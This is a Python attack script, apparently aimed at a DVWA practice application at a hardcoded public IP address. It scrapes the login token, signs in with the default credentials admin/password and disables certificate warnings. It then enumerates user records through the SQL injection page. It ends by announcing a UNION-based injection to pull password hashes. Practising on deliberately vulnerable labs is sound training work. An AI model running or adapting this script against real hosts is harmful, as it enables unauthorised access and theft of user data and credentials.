
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

# Test SQL injection to find other user IDs
sqli_url = f"{url_base}/vulnerabilities/sqli/"

# Try to extract data from users table with different IDs
print("[*] Extracting user data from database:\n")
users_data = []

# Let's try IDs 1-10 first
for user_id in range(1, 11):
    response = session.get(sqli_url, params={"id": str(user_id), "Submit": "Submit"}, verify=False)
    
    # Extract user info
    id_match = re.search(r'ID: (\d+)', response.text)
    fname_match = re.search(r'First name: ([^<\n]+)', response.text)
    sname_match = re.search(r'Surname: ([^<\n]+)', response.text)
    
    if id_match:
        user_id_val = id_match.group(1)
        fname = fname_match.group(1) if fname_match else "N/A"
        sname = sname_match.group(1) if sname_match else "N/A"
        
        print(f"[+] ID: {user_id_val}, First name: {fname}, Surname: {sname}")
        users_data.append({
            "id": user_id_val,
            "fname": fname,
            "sname": sname
        })
    else:
        # No valid data for this ID
        pass

print(f"\n[*] Found {len(users_data)} users")
print("\n[*] Now trying to extract password hashes using UNION-based SQLi...")

